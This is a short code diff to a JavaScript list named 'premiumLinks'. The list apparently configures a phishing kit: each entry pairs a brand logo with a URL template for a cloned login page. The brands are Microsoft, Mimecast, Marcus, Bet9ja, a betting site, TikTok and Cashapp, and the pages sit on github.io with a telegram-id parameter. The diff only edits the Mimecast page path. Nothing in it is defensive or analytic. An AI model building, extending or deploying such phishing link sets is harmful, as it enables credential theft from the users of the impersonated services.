@@ -2,7 +2,7 @@ const premiumLinks = [
  { name: "Microsoft Login", image: "https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/1024px-Microsoft_logo.svg.png", urlTemplate: "https://eal876955-lgtm.github.io/npi/m/mt.htm?id={telegram-id}" },
   { name: "Sporty bet clone Login", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS9GFPuwZ7XpRmmDorr5EkOhCxjdn3SUsqHpEJs0sBnDDiyyMR5SEQyBG0&s=10", urlTemplate: "https://eal876955-lgtm.github.io/npi/s/s.html?id={telegram-id}" },
   { name: "Bet Naija Login", image: "https://upload.wikimedia.org/wikipedia/en/9/90/Bet9ja_logo.jpeg", urlTemplate: "https://eal876955-lgtm.github.io/npi/bn/m.html?id={telegram-id}" },
- { name: "Mimecast Login", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQYYBynoeQSYPfn00CW_eRNUshdVhKsXHdvt45OwFINpw&s=10", urlTemplate: "https://eal876955-lgtm.github.io/npi/mm?id={telegram-id}" },
+ { name: "Mimecast Login", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQYYBynoeQSYPfn00CW_eRNUshdVhKsXHdvt45OwFINpw&s=10", urlTemplate: "https://eal876955-lgtm.github.io/npi/mm/index.html?id={telegram-id}" },
   { name: "Marcus login", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTw5bw2g-P2kMY5jlunJ8RvqAe3RmTRcOEpbeFZUh2uPCbPaeVYLFWi364&s=10", urlTemplate: "https://eal876955-lgtm.github.io/npi/ma/ms.html?id={telegram-id}" },
 { name: "Tiktok", image: "https://rrloaty.github.io/intelligent/tiktok.png", urlTemplate: "https://ilyelya.github.io/n/tiktok.html?id={telegram-id}" },
    { name: "Cashapp", image: "https://rrloaty.github.io/intelligent/cash.png", urlTemplate: "https://ilyelya.github.io/n/cash.html?id={telegram-id}" },
